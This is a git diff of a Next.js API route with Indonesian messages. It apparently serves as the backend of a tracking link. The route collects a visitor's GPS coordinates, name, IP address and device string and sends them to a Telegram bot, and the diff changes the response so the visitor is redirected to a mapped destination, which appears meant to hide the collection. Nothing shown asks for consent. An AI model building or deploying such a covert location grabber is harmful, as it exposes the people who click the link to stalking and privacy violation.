@@ -1,4 +1,5 @@
 import type { NextApiRequest, NextApiResponse } from 'next';
+import linkMap from '../../../data/linkMap';
 
 export default async function handler(req: NextApiRequest, res: NextApiResponse) {
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -8,24 +9,30 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
   if (req.method === 'OPTIONS') return res.status(200).end();
   if (req.method !== 'POST') return res.status(405).json({ message: 'Method Not Allowed' });
 
+  const { id } = req.query;
   const { lat, lon, acc, nama } = req.body;
+
+  if (!id || !lat || !lon || !nama) {
+    return res.status(400).json({ message: 'Data tidak lengkap.' });
+  }
+
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const userAgent = req.headers['user-agent'];
   const timestamp = new Date().toISOString();
   const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-  const botToken = process.env.TELEGRAM_BOT_TOKEN_LOKASI!;
-  const chatId = process.env.TELEGRAM_CHAT_ID_LOKASI!;
+  const botToken = process.env.TELEGRAM_BOT_TOKEN_LINK!;
+  const chatId = process.env.TELEGRAM_CHAT_ID_LINK!;
   const message = `
-📥 *Pelacakan Lokasi Masuk*
+🔗 *Klik Link: ${id}*
 
 👤 *Nama:* ${nama}
-🖥️ *Perangkat:* ${userAgent}
+🖥️ *Device:* ${userAgent}
 🌐 *IP:* ${ip}
 📍 *Lokasi:* ${lat}, ${lon} (±${acc}m)
 🕒 *Waktu:* ${timestamp}
 
-[📍 Google Maps](${mapUrl})
+[📍 Buka Maps](${mapUrl})
 `;
 
   await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -39,5 +46,6 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
     }),
   });
 
-  res.status(200).json({ message: 'Data lokasi dikirim ke Telegram' });
+  const redirectLink = linkMap[id as string] || 'https://google.com';
+  res.status(200).json({ redirectTo: redirectLink });
 }
